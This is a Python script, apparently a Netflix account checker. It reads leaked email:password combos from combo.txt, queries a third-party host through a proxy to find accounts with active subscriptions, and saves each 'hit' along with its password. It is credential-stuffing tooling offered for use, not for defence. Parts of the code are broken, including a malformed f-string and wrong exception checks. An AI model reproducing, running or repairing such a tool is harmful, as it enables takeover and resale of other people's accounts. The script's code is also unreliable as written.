import requests
import threading
import time
import random
from queue import Queue

class NetflixVM:
    def __init__(self, email: str, password : str):
        self.email = email
        self.password = password
        
        self.proxy = 'host:port:user:pass'
    
    def VM(self):
        url = f'https://aorets.vip/nf/api.php?email={self.email}&proxy={self.proxy}'
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                data = r.json()
                # print(data)
                if data.get('status') == 'SUBSCRIBED':

                    info = f"f"{self.email}:{self.password} | Has Subscription""
                    print(f"[ ! ] HIT " +   info)
                    with open('hits.txt', 'a+') as dfd:
                        dfd.write(f'{info}\n')
        except Exception as e:
            if 'HTTPSConnectionPool' in e:
                pass
            if 'Thread' in e:
                pass
            else:
                print(f"Error checking {self.email}: {str(e)}")

def worker(queue,password):
    while not queue.empty():
        try:
            email = queue.get_nowait()
            checker = NetflixVM(email,password)
            checker.VM()
            queue.task_done()
        except Exception as e:
            print(f"Error in worker thread: {str(e)}")

def start_checking():
    combo_count = 0
    max_threads = 40
    
    try:
        # Read all combos first
        with open("combo.txt", "r", encoding="utf-8") as combo_file:
            # combos = [line.strip().split(':', 1)[0] for line in combo_file if ':' in line]
            for combo in combo_file:
                d = combo.split(':')
                email = d[0]
                password = d[1]
                # print(email)
                queue = Queue()
                queue.put(email)
                threads = []
                for _ in range(max_threads):
                    thread = threading.Thread(target=worker, args=(queue,password))
                    thread.daemon = True  # This helps with proper thread cleanup
                    thread.start()
                    threads.append(thread)
                
                queue.join()

        
    except FileNotFoundError:
        print("[!] Error: combo.txt or proxies.txt file not found!")
    except Exception as e:
        print(f"[!] Error: {str(e)}")
    finally:
        print("\n[+] Checking completed!")
        print(f"[+] Total accounts checked: {combo_count}")

if __name__ == "__main__":
    try:
        start_checking()
    except KeyboardInterrupt:
        time.sleep(1)
